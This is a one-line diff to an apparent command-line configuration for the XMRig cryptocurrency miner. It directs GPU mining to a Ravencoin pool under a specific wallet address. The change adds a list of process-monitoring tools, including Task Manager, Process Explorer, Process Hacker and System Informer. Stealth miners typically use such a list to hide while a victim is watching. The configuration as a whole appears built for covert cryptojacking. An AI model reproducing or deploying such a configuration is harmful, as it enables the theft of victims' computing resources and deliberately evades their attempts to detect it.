@@ -1,1 +1,1 @@
-xmrig.exe --url=rvn.2miners.com:16060 --user=RBuZGFypkReooerkFPEFFaeLhF5fCL3yv8 --pass=REDPANDA --algo=kawpow --tls --keepalive --cuda --opencl --no-cpu
+xmrig.exe --url=rvn.2miners.com:16060 --user=RBuZGFypkReooerkFPEFFaeLhF5fCL3yv8 --pass=REDPANDA --algo=kawpow --tls --keepalive --cuda --opencl --no-cpu taskmgrs=taskmgr,resmon,perfmon,procexp,procmon,procdump,processhacker,systeminformer,processlasso,systemexplorer,anvir,securitytaskmanager,taskexplorer,pchunter
